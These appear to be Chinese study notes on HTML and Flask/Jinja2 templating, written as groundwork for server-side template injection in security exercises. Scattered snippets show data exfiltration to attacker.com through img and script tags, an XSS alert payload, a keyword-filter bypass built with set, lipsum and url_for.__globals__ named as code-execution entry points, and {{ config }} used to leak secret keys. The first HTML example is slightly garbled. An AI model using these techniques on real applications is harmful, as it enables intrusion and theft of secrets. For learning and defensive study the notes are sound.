# HTML

## 1. 最小HTML骨架

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>网页标题</title>
</head>
<body>
    <h1>这是一级标题（字最大）</h1>
    <p>这是一个段落，用来写正文。
以放其他内容。
    </div>
</body>
</html>
```

## 2. 四类标签

### A.交互类标签

| 标签         | 作用         | 安全关注点                                       |
| ------------ | ------------ | ------------------------------------------------ |
| `<form>`     | 数据提交区域 | `action`（提交给谁）、`method`（GET/POST）       |
| `<input>`    | 输入框       | `name`（参数名）、`type`（text/password/hidden） |
| `<textarea>` | 多行输入     | 常用于评论、富文本，是 XSS/SSTI 高发区           |
| `<select>`   | 下拉选择     | 前端限制可被绕过                                 |

```html
<form action="/login" method="POST">
    <input name="username" type="text">
    <input name="password" type="password">
    <input name="csrf_token" type="hidden" value="xxx">
    <!-- 💡 hidden 域用户界面看不见，但 F12 或 Burp 可以任意修改 -->
</form>
```

### B. 文本与容器标签(通常是回显位置)

```html
<div>布局容器</div>
<span>行内容器</span>
<p>段落</p>
<h1>~<h6>  标题
<b> / <strong>  加粗
```

**这类标签通常是服务端渲染后"用户输入出现的地方"**

### C. 资源引用标签（用于外带数据）

```html
<img src="http://attacker.com/?data=xxx">  <!-- 💡 图片加载可带走数据 -->
<a href="http://attacker.com/">点击</a>     //<a>超链接  //href属性，点击后跳转的地址
<script src="http://attacker.com/evil.js"></script>
<link rel="stylesheet" href="...">
```

### D. 脚本与注释（混淆与隐藏）

```html
<script>alert(1)</script>         <!-- JavaScript 代码 -->
<!-- 这是 HTML 注释 -->            <!-- F12 可见，别在注释里写密码 -->
```

## 3. 注加

```
模板的方便之处：
1.逻辑分离：Python 只管处理数据，HTML 只管页面长什么样
2.易于维护：改页面不用动后端代码 
3.安全性：模版引擎通常会自动处理一些基本的
最终发送给浏览器的内容：渲染后的纯 HTML 字符串
```

# Flask模板(默认Jinja2)

## 1. 概念

Flask 是 Python 的轻量级 Web 框架，"轻量"的意思是：**它自己只做路由和请求响应，模板渲染交给 Jinja2**

```
用户浏览器
    │  HTTP 请求
    ▼
Flask（路由分发）
    │  调用视图函数
    ▼
视图函数（Python 代码）
    │  return render_template_string("模板", context=数据)
    ▼
Jinja2（模板引擎）       ← 💡 SSTI 发生在这一层
    │  把 "模板" 里的 {{ }} 替换成数据
    ▼
HTML 字符串
    │
    ▼
用户浏览器
```

- 最小Flask应用示例：

```python
from flask import Flask

app = Flask(__name__)

@app.route('/')
def index():
    return "<h1>Hello, World!</h1>"

if __name__ == '__main__':
    app.run(debug=True)
```

运行：

```
pip install flask
python app.py
# 访问 http://127.0.0.1:5000/
```

## 2. Jinja2模板语法

Jinja2 有三种定界符，这是 SSTI 的"语法基础"

| 定界符      | 作用                             | 是否有输出 |
| ----------- | -------------------------------- | ---------- |
| `{{ ... }}` | **表达式**：计算并输出结果       | 有输出     |
| `{% ... %}` | **语句**：执行逻辑（if/for/set） | 无输出     |
| `{# ... #}` | **注释**：不渲染到 HTML          | 无输出     |

### 2.1 表达式`{{...}}`

只要放在这里面的东西，Jinja2 都会尝试将其计算并转换为字符串输出

```jinja2
{{ name }}              {# 输出变量 #}
{{ 1 + 1 }}             {# 输出 2 #}
{{ user.name }}         {# 输出对象属性 #}
{{ "hello"|upper }}     {# 输出 HELLO（过滤器） #}
{{ func(arg) }}         {# 调用函数 #}
```

### 2.2 语句`{%...%}`

常用于定义变量或控制流程

#### 选择结构if

```jinja2
{% if age >= 18 %}
    <p>成年</p>
{% elif age >= 12 %}
    <p>青少年</p>
{% else %}
    <p>儿童</p>
{% endif %}
```

**注意：Jinja2 的 if 必须用 `{% endif %}` 显式闭合**，跟Python 不一样

#### 循环结构for

用于遍历

```jinja2
<ul>
{% for item in items %}
    <li>{{ loop.index }}. {{ item }}</li>
{% endfor %}
</ul>
```

`loop` 是循环内自动可用的对象：

| 属性          | 含义                      |
| ------------- | ------------------------- |
| `loop.index`  | 当前迭代次数（从 1 开始） |
| `loop.index0` | 当前迭代次数（从 0 开始） |
| `loop.first`  | 是否第一次迭代            |
| `loop.last`   | 是否最后一次迭代          |
| `loop.length` | 总长度                    |

- **遍历列表**

```jinja2
<ul>
{% for item in items %}
    <li>{{ item }}</li>
{% endfor %}
</ul>
```

- **遍历字典**

```jinja2
{% for key, value in user_info.items() %}

    <p>{{ key }}: {{ value }}</p>

{% endfor %}
```

#### set赋值

```jinja2
{% set user = "Kiro" %}
{% set nums = [1, 2, 3] %}
<p>Hello, {{ user }}!</p>
```

**`set` 是后续绕过 WAF 的核心武器**。当 `os`、`system` 等关键字被过滤时，可以用 `set` 拼接：

```jinja2
{% set a = 'o' %}{% set b = 's' %}{% set cmd = a + b %}
```

#### with局部作用域

```jinja2
{% with user = "Kiro" %}
    <p>{{ user }}</p>   {# 这里能用 #}
{% endwith %}
{# 出了 with 块，user 不可用 #}
```

对比 `set`（全局）：

```jinja2
{% set x = 1 %}    {# 整个模板都能用 #}
{% with y = 2 %}   {# 仅 with 块内可用 #}
```

### 2.3 模板继承entends + block

让多个页面共享同一套布局：

**base.html（父模板）**

```jinja2
<!DOCTYPE html>
<html>
<head>
    {% block head %}
    <title>{% block title %}默认标题{% endblock %}</title>
    {% endblock %}
</head>
<body>
    {% block content %}{% endblock %}
</body>
</html>
```

**index.html（子模板）**

```jinja2
{% extends "base.html" %}

{% block title %}首页{% endblock %}

{% block content %}
    <h1>欢迎</h1>
{% endblock %}

{# 如果想保留父模板的内容再追加，用 super() #}
{% block head %}
    {{ super() }}
    <link rel="stylesheet" href="style.css">
{% endblock %}
```

### 2.4 过滤器(Filter)

过滤器用 `|` 连接，对值做转换：

```jinja2
{{ name|upper }}              {# 转大写 #}
{{ name|lower }}              {# 转小写 #}
{{ text|length }}             {# 长度 #}
{{ text|default('N/A') }}     {# 默认值 #}
{{ html|safe }}               {# 不转义（⚠️ 危险） #}
{{ html|escape }}             {# 强制转义 #}
{{ obj|attr('name') }}        {# 获取属性 #}
{{ list|join(',') }}          {# 拼接列表 #}
```

### 2.5 渲染方式

####  `render_template`

渲染模板文件（推荐）

```python
from flask import render_template

@app.route('/user/<name>')
def user(name):
    return render_template('user.html', name=name)
```

目录结构：

```
project/
├── app.py
└── templates/
    └── user.html
```

user.html

```html
<h1>Hello, {{ name }}!</h1>
```

这种方式是安全的：模板文件固定，用户输入只作为 `name` 变量传入

#### `render_template_string`

渲染字符串（危险区）

```python
from flask import render_template_string

@app.route('/hello')
def hello():
    name = request.args.get('name', 'Guest')
    
    # ✅ 安全：模板字符串固定，name 作为数据
    return render_template_string("<h1>Hello, {{ name }}!</h1>", name=name)
    
    # ❌ 危险：用户输入拼接进模板字符串本身
    return render_template_string(f"<h1>Hello, {name}!</h1>")
```

### 2.6 Flask内置

#### 内置对象+函数

| 名称                   | 类型           | 用途                        | 后续攻击价值                               |
| ---------------------- | -------------- | --------------------------- | ------------------------------------------ |
| `config`               | Flask 配置对象 | 访问 `SECRET_KEY` 等配置    | 泄露密钥，伪造 session                     |
| `request`              | 请求对象       | 访问 URL 参数、表单、Header | 引入外部字符串绕过过滤                     |
| `session`              | 会话对象       | 读写用户会话                | 查看当前用户的登录状态或隐藏的 Cookie 数据 |
| `g`                    | 对象           | 请求上下文，临时存储        | 视场景                                     |
| `url_for`              | 函数           | 生成 URL                    | `url_for.__globals__` 是经典入口           |
| `get_flashed_messages` | 函数           | 读取 flash 消息             | `__globals__` 入口                         |
| `lipsum`               | 函数           | 生成假文本（来自 Jinja2）   | **最常用的 RCE 入口**                      |
| `cycler`               | 类             | 循环辅助工具                | `cycler.__init__.__globals__`              |
| `namespace`            | 类             | 命名空间                    | 部分版本可用                               |
| `self`                 | 模板自身       | 访问当前模板                | 信息探测                                   |
| `flask`                | 对象           | app的动态代理               | 作为config的替身                           |

表格最后一行的flask：`{{ current_app.config['FLAG'] }}` 绕过被污染的「局部变量 config」，直接找到持有「真实 app.config」的 Flask 应用

- **url_for**示例

```jinja2
<a href="{{ url_for('index') }}">首页</a>
<a href="{{ url_for('user', name='Kiro') }}">Kiro 的主页</a>
<link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
```

- **request**

```jinja2
<p>您的 IP：{{ request.remote_addr }}</p>
<p>当前 URL：{{ request.url }}</p>
<p>User-Agent：{{ request.headers.get('User-Agent') }}</p>
```

- **config**

```jinja2
{% if config.DEBUG %}
    <p>调试模式开启</p>
{% endif %}
```

注意 `config` 对象里通常存着 `SECRET_KEY`、`DATABASE_URI` 等敏感信息。如果存在 SSTI，一句 `{{ config }}` 就能把它们全部泄露出来

##### request对象的常用属性

| 属性                  | 含义                 |
| --------------------- | -------------------- |
| `request.args`        | URL 查询参数（GET）  |
| `request.form`        | 表单数据（POST）     |
| `request.values`      | args + form 合集     |
| `request.cookies`     | Cookie 字典          |
| `request.headers`     | 请求头               |
| `request.method`      | 请求方法（GET/POST） |
| `request.url`         | 完整 URL             |
| `request.path`        | 路径部分             |
| `request.remote_addr` | 客户端 IP            |
| `request.files`       | 上传的文件           |

**`request.args.get('x')`** 可以在模板中直接读取 URL 参数 —— 这让攻击者可以把"恶意字符串"从 URL 参数带进模板，绕过对模板字符串本身的过滤

### 2.7 自动转义Autoescape

Flask 默认为 `.html` / `.htm` / `.xml` / `.xhtml` 文件开启自动转义：

```python
user_input = '<script>alert(1)</script>'

# 模板：{{ user_input }}
# 输出：&lt;script&gt;alert(1)&lt;/script&gt;
# 浏览器显示：<script>alert(1)</script>（纯文本，不会执行）
```

**关闭转义的方式**

```python
{{ user_input|safe }}          {# 对单个变量关闭 #}

{% autoescape false %}
    {{ user_input }}           {# 块内所有变量关闭转义 #}
{% endautoescape %}
```
